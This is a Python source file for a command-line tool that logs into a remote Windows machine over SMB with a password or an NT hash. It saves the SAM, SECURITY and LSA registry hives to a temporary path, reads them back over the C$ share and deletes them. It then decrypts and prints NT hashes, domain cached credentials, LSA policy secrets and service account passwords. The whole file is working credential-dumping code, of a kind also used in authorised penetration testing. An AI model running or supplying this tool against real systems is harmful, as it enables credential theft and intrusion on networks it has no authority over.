#!/usr/bin/env python3

from asyncio import run as asyncio_run
from argparse import Namespace as ArgparseNamespace
from pathlib import PureWindowsPath
from uuid import uuid4
from typing import Dict, Optional, List, Union, Tuple
from io import BytesIO
from ipaddress import IPv4Address, IPv6Address
from sys import stderr
from logging import getLogger, WARNING, StreamHandler

from smb.contrib.argument_parsers import SmbSingleAuthenticationArgumentParser
from smb.transport import TCPIPTransport
from smb.v2.connection import Connection as SMBv2Connection
from smb.v2.messages.create import CreateOptions, FilePipePrinterAccessMask
from smb.v2.session import Session as SMBv2Session
from rpc.connection import Connection as RPCConnection
from rpc.structures.context_list import ContextList, ContextElement
from ms_rrp import MS_RRP_ABSTRACT_SYNTAX, MS_RRP_PIPE_NAME
from ms_rrp.operations.base_reg_open_key import base_reg_open_key, BaseRegOpenKeyRequest
from ms_rrp.operations.open_local_machine import open_local_machine, OpenLocalMachineRequest, Regsam
from ms_rrp.operations.base_reg_save_key import base_reg_save_key, BaseRegSaveKeyRequest
from ms_scmr import MS_SCMR_ABSTRACT_SYNTAX, MS_SCMR_PIPE_NAME
from ms_scmr.operations.r_open_sc_manager_w import r_open_sc_manager_w, ROpenSCManagerWRequest
from msdsalgs.ntstatus_value import StatusLogonFailureError, StatusBadNetworkNameError
from pyutils.my_string import underline, text_align_delimiter
from Registry.Registry import Registry

from dump_lsa import dump_lsa_secrets
from dump_lsa.structures.domain_cached_credentials import DomainCachedCredentials2
from dump_lsa.key_extraction import get_boot_key
from dump_lsa.secrets_parsing import extract_service_passwords
from dump_sam import dump_sam_secrets, SAMEntry


LOG = getLogger(__name__)


# TODO: Move to another library? `ms_rrp` as contrib?
async def dump_reg(
    rpc_connection: RPCConnection,
    smb_session: SMBv2Session,
    root_key_handle: bytes,
    tree_id: int,
    sub_key_name: str,
    save_path: Optional[PureWindowsPath] = None,
    sam_desired: Regsam = Regsam(maximum_allowed=True),
    delete_file_on_close: bool = True
) -> bytes:
    save_path = save_path or PureWindowsPath(f'C:\\Windows\\Temp\\{uuid4()}')

    base_reg_open_key_options = dict(
        rpc_connection=rpc_connection,
        request=BaseRegOpenKeyRequest(key_handle=root_key_handle, sub_key_name=sub_key_name, sam_desired=sam_desired)
    )
    async with base_reg_open_key(**base_reg_open_key_options) as lsa_key_handle:
        await base_reg_save_key(
            rpc_connection=rpc_connection,
            request=BaseRegSaveKeyRequest(
                key_handle=lsa_key_handle,
                save_path=save_path
            )
        )

    create_kwargs = dict(
        path=PureWindowsPath(*save_path.parts[1:]),
        tree_id=tree_id,
        create_options=CreateOptions(non_directory_file=True, delete_on_close=delete_file_on_close),
        desired_access=FilePipePrinterAccessMask(file_read_data=True, delete=delete_file_on_close)
    )
    async with smb_session.create(**create_kwargs) as create_response:
        return await smb_session.read(
            file_id=create_response.file_id,
            file_size=create_response.endof_file,
            tree_id=tree_id
        )


async def resolve_service_credentials_with_rpc_connection(
    rpc_connection: RPCConnection,
    policy_secrets: Dict[str, bytes]
) -> Dict[str, str]:
    r_open_sc_manager_w_options = dict(rpc_connection=rpc_connection, request=ROpenSCManagerWRequest())
    async with r_open_sc_manager_w(**r_open_sc_manager_w_options) as r_open_sc_manager_w_response:
        return await extract_service_passwords(
            rpc_connection=rpc_connection,
            sc_manager_handle=r_open_sc_manager_w_response.scm_handle,
            policy_secrets=policy_secrets
        )


async def resolve_service_credentials(smb_session: SMBv2Session, policy_secrets: Dict[str, bytes]) -> Dict[str, str]:
    async with smb_session.make_smbv2_transport(pipe=MS_SCMR_PIPE_NAME) as (r, w):
        async with RPCConnection(reader=r, writer=w) as rpc_connection:
            await rpc_connection.bind(
                presentation_context_list=ContextList([
                    ContextElement(context_id=0, abstract_syntax=MS_SCMR_ABSTRACT_SYNTAX)
                ])
            )

            return await resolve_service_credentials_with_rpc_connection(
                rpc_connection=rpc_connection,
                policy_secrets=policy_secrets
            )


async def dump_remote_windows_secrets(
    smb_session: SMBv2Session,
    skip_lsa_secrets: bool = False,
    skip_sam_secrets: bool = False,
    dump_reg_share_name: str = 'C$',
    dump_reg_path: Optional[PureWindowsPath] = None
) -> Tuple[Optional[List[SAMEntry]], Optional[List[DomainCachedCredentials2]], Optional[Dict[str, bytes]]]:
    """
    Dump Windows secrets remotely over SMB.

    The secrets are obtained by reading and then processing data from the Windows registry. The MS-RRP protocol is used
    to do read this data remotely. The relevant registry values are saved to disk on the remote system with the
    `BaseRegSaveKey` RRP operation, and are then retrieved via the SMB READ command, after which the files on disk are
    deleted.

    :param smb_session: An SMB session with which to remotely dump the Windows secrets.
    :param skip_lsa_secrets: Whether to skip the extraction of LSA secrets.
    :param skip_sam_secrets: Whether to skip the extraction of SAM secrets.
    :param dump_reg_share_name: A name of an SMB share on the remote system in which the disk-saved registry values can
        be obtained.
    :param dump_reg_path: A path on the remote system where the relevant registry values are to be saved on disk.
    :return: Optionally, a list of SAM entries, domain cached credentials, and policy secrets.
    """

    if skip_lsa_secrets and skip_sam_secrets:
        return None, None, None

    async with smb_session.tree_connect(share_name=dump_reg_share_name) as (tree_id, _):
        async with smb_session.make_smbv2_transport(pipe=MS_RRP_PIPE_NAME) as (r, w):
            async with RPCConnection(reader=r, writer=w) as rpc_connection:
                await rpc_connection.bind(
                    presentation_context_list=ContextList([
                        ContextElement(context_id=0, abstract_syntax=MS_RRP_ABSTRACT_SYNTAX)
                    ])
                )

                open_local_machine_options = dict(
                    rpc_connection=rpc_connection,
                    request=OpenLocalMachineRequest(
                        sam_desired=Regsam(maximum_allowed=True)
                    )
                )
                async with open_local_machine(**open_local_machine_options) as local_machine_key_handle:
                    # TODO: `asyncio.gather` isn't working here for some reason...

                    lsa_data: bytes = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=local_machine_key_handle,
                        tree_id=tree_id,
                        sub_key_name=r'SYSTEM\CurrentControlSet\Control\Lsa',
                        save_path=dump_reg_path
                    )

                    security_data: Optional[bytes] = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=local_machine_key_handle,
                        tree_id=tree_id,
                        sub_key_name='SECURITY',
                        save_path=dump_reg_path
                    ) if not skip_lsa_secrets else None

                    sam_data: Optional[bytes] = await dump_reg(
                        rpc_connection=rpc_connection,
                        smb_session=smb_session,
                        root_key_handle=local_machine_key_handle,
                        tree_id=tree_id,
                        sub_key_name='SAM',
                        save_path=dump_reg_path
                    ) if not skip_sam_secrets else None

    boot_key = get_boot_key(lsa_registry=Registry(BytesIO(lsa_data)), from_root=False)

    if not skip_lsa_secrets:
        domain_cached_credentials, policy_secrets = dump_lsa_secrets(
            security_registry=Registry(BytesIO(security_data)),
            boot_key=boot_key
        )
    else:
        domain_cached_credentials, policy_secrets = None, None

    return (
        dump_sam_secrets(sam_dump=sam_data, boot_key=boot_key) if not skip_sam_secrets else None,
        domain_cached_credentials,
        policy_secrets
    )


async def pre_dump_remote_windows_secrets(
    address: Union[str, IPv4Address, IPv6Address],
    username: str,
    authentication_secret: Union[str, bytes],
    port_number: int = 445,
    skip_lsa_secrets: bool = False,
    skip_sam_secrets: bool = False,
    dump_reg_share_name: str = 'C$',
    dump_reg_path: Optional[PureWindowsPath] = None,
    skip_resolve_service_passwords: bool = False
):

    async with TCPIPTransport(address=address, port_number=port_number) as tcp_ip_transport:
        async with SMBv2Connection(tcp_ip_transport=tcp_ip_transport) as smb_connection:
            await smb_connection.negotiate()
            async with smb_connection.setup_session(username=username, authentication_secret=authentication_secret) as smb_session:
                sam_entries, domain_cached_credentials, policy_secrets = await dump_remote_windows_secrets(
                    smb_session=smb_session,
                    skip_lsa_secrets=skip_lsa_secrets,
                    skip_sam_secrets=skip_sam_secrets,
                    dump_reg_share_name=dump_reg_share_name,
                    dump_reg_path=dump_reg_path
                )

                account_name_to_password: Dict[str, str] = await resolve_service_credentials(
                    smb_session=smb_session,
                    policy_secrets=policy_secrets
                ) if (not skip_lsa_secrets and not skip_resolve_service_passwords) else None

    print(
        '\n\n'.join(
            section
            for section in [
                text_align_delimiter(
                    text=(
                        f"{underline(string='SAM entries')}\n\n"
                        + (
                            '\n\n'.join(
                                f'Account name: {sam_entry.account_name}\n'
                                f'NT hash: {sam_entry.nt_hash.hex()}'
                                for sam_entry in sam_entries if sam_entry.nt_hash is not None
                            )
                        )
                    ),
                    put_non_match_after_delimiter=False
                ) if sam_entries else None,
                text_align_delimiter(
                    text=(
                        f"{underline(string='Service credentials')}\n\n"
                        + (
                            '\n\n'.join(
                                f'Account name: {account_name}\n'
                                f'Password: {password}'
                                for account_name, password in account_name_to_password.items()
                            )
                        )
                    ),
                    put_non_match_after_delimiter=False
                ) if account_name_to_password else None,
                text_align_delimiter(
                    text=(
                        f"{underline(string='Domain cached credentials')}\n\n"
                        + (
                            '\n'.join(
                                str(domain_cached_credentials_entry)
                                for domain_cached_credentials_entry in domain_cached_credentials
                            )
                        )
                    ),
                    put_non_match_after_delimiter=False
                ) if domain_cached_credentials else None,
                text_align_delimiter(
                    text=(
                        f"{underline(string='Policy secrets')}\n\n"
                        + (
                            '\n'.join(
                                f'{key}: {value.hex()}' for key, value in policy_secrets.items()
                            )
                        )
                    ),
                    put_non_match_after_delimiter=False
                ) if policy_secrets else None,
            ]
            if section
        )
    )


class DumpRemoteWindowsSecretsArgumentParser(SmbSingleAuthenticationArgumentParser):
    def __init__(self, *args, **kwargs):
        super().__init__()
        self.add_argument(
            'target_address',
            type=str,
            metavar='TARGET_ADDRESS',
            help='The address of the SMB server whose share files to be enumerated.'
        )

        self.add_argument(
            '--skip-lsa-secrets',
            action='store_true',
            help='Whether to skip the extraction of LSA secrets.'
        )

        self.add_argument(
            '--skip-sam-secrets',
            action='store_true',
            help='Whether to skip the extraction of SAM secrets.'
        )

        self.add_argument(
            '--skip-service-passwords',
            action='store_true',
            help='Whether to skip the resolution of service passwords from the LSA secrets.'
        )

        self.add_argument(
            '--dump-reg-share',
            type=str,
            help='A name of an SMB share on the remote system in which the disk-saved registry values can be obtained.',
            default='C$'
        )

        self.add_argument(
            '--dump-reg-path',
            type=PureWindowsPath,
            help='A path on the remote system where the relevant registry values are to be saved on disk.'
        )


async def main():
    args: ArgparseNamespace = DumpRemoteWindowsSecretsArgumentParser().parse_args()

    LOG.setLevel(level=WARNING)
    LOG.addHandler(StreamHandler(stderr))

    try:
        await pre_dump_remote_windows_secrets(
            address=args.target_address,
            username=args.username,
            authentication_secret=args.password or bytes.fromhex(args.nt_hash),
            skip_lsa_secrets=args.skip_lsa_secrets,
            skip_sam_secrets=args.skip_sam_secrets,
            dump_reg_share_name=args.dump_reg_share,
            dump_reg_path=args.dump_reg_path,
            skip_resolve_service_passwords=args.skip_service_passwords
        )
    except StatusLogonFailureError as e:
        LOG.error(f'{e} -- Username: {args.username}, Authentication secret: {args.password or args.nt_hash}.')
    except StatusBadNetworkNameError as e:
        LOG.error(f'{e} -- Share name: {args.dump_reg_share}.')
    except Exception as e:
        LOG.exception(e)


if __name__ == '__main__':
    asyncio_run(main())
